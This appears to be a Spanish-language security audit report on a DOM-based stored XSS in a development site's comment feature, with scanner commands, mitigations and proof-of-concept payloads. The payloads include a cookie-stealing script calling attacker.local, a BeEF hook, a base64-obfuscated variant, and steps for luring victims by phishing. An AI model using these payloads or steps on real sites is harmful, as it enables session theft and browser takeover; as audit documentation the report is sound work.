# Informe de auditoría XSS

Fecha: 2026-04-27T18:17:32Z
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
Se ha identificado una vulnerabilidad Cross-Site Scripting persistente/DOM (almacenada en localStorage) en la funcionalidad de comentarios.

Estado
------
- Vulnerabilidad: XSS (Stored/DOM)
- Parámetros vulnerables: name, comment (GET)
- Confirmación: Sí (se refleja/ejecuta JavaScript cuando un usuario visita la URL maliciosa)

Descripción técnica
-------------------
La aplicación usa parámetros GET `name` y `comment` en el cliente para construir un objeto y guardarlo en localStorage, y más tarde recupera y renderiza esos valores mediante `document.write()` sin ninguna sanitización.
Flujo vulnerable:
1. Usuario visita: http://web.dev.local:8082/?name=...&comment=...
2. El script cliente lee `name` y `comment`, los añade a `localStorage` y redirige a la ruta limpia.
3. En la carga siguiente, `displayComments()` lee `localStorage` y `document.write()` inserta `c.name` y `c.comment` directamente en el DOM, ejecutando código inyectado.

Tipo de XSS: DOM-based Stored (persistente en el almacenamiento local del navegador del cliente, ejecutado en el contexto DOM al renderizar comentarios).

Comandos y herramientas (ejemplos usados/recomendados)
----------------------------------------------------
- Curl (para comprobar respuesta estática):
  curl -s 'http://web.dev.local:8082/' -o homepage.html

- DalFox (fuzzing/reflected checks):
  dalfox url "http://web.dev.local:8082/?search=FUZZ" --bounty

- XSStrike (fuzzing y generación de payloads):
  xsstrike -u "http://web.dev.local:8082/?search=PAYLOAD" --blind

- ffuf (fuzzing parámetros):
  ffuf -u "http://web.dev.local:8082/?FUZZ=FOO" -w /usr/share/seclists/Discovery/Web-Content/common.txt

Nota: la vulnerabilidad se confirma analizando el código fuente servido y el flujo JavaScript; los escáneres ayudan a automatizar, pero la confirmación clave se realizó revisando el DOM y la lógica de localStorage/document.write.

Payloads de prueba (PoC)
-----------------------
1) Payload simple de prueba (alert):
URL PoC (codificar el payload):
http://web.dev.local:8082/?name=Attacker&comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E

2) Exfiltración de cookies (payload ofensivo):
Payload (HTML/JS):
<script>new Image().src='http://attacker.local:8000/steal?c='+encodeURIComponent(document.cookie)</script>

URL PoC codificada:
http://web.dev.local:8082/?name=Attacker&comment=%3Cscript%3Enew%20Image().src%3D'http%3A%2F%2Fattacker.local%3A8000%2Fsteal%3Fc%3D'%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E

3) BeEF hook (simulación de toma de control):
<script src="http://attacker.local:3000/hook.js"></script>

4) Evasión mediante Base64 (ofuscación):
<script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIubG9jYWw6ODAwMC9zdGVhbD9jPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk='))</script>
(Ejemplo: `btoa("new Image().src='http://attacker.local:8000/steal?c='+encodeURIComponent(document.cookie)")` genera la cadena base64 usada arriba.)

Pasos para reproducir (victimación)
----------------------------------
1. Construir la URL con el payload en el parámetro `comment` (y opcionalmente `name`) y enviarla a la víctima (phishing, enlace interno, etc.).
2. La víctima abre la URL en su navegador; el script cliente guarda el comentario en localStorage y redirige a la ruta principal.
3. En la carga siguiente, el código recupera y document.write() el contenido almacenado, ejecutando el payload en el contexto del sitio.
4. Si el payload exfiltra cookies o carga un hook externo, los datos/gancho se entregarán al servidor atacante (http://attacker.local:8000 o BeEF listener).

Impacto
-------
- Robo de sesión (cookies) y tokens almacenados en `document.cookie`.
- Ejecución de acciones en nombre del usuario (CSRF con XSS persistente).
- Posible instalación de hooks (BeEF) para control de navegador y pivoting interno.

Evidencia
---------
- Fragmentos relevantes del código fuente cliente (extraído de la página):
  - Uso de `urlParams.get('name')` y `urlParams.get('comment')` para guardar en localStorage.
  - Uso de `document.write()` para renderizar `c.name` y `c.comment` sin sanitización.

Mitigación recomendada
----------------------
1. Nunca utilizar `document.write()` para renderizar contenido dinámico; usar textContent/innerText al insertar texto o una librería de plantillas que escape contenido.
2. Escapar o sanitizar cualquier entrada de usuario antes de almacenarla o renderizarla.
3. Validar/normalizar la entrada en servidor si se acepta almacenamiento persistente real.
4. Implementar Content Security Policy (CSP) restrictiva para evitar la carga de scripts remotos y la ejecución de inline scripts.
5. Evitar confiar en almacenamiento local para contenidos que se rendericen sin pasar por sanitización.

Conclusión
----------
Se confirma una vulnerabilidad XSS (almacenada vía localStorage y ejecutada en el DOM) en los parámetros `name` y `comment`. Se proporciona PoC y payloads de explotación (cookie exfiltration y BeEF hook). Se recomienda corregir cuanto antes las prácticas inseguras de renderizado y añadir protección en el lado cliente y servidor.

-- Fin del informe
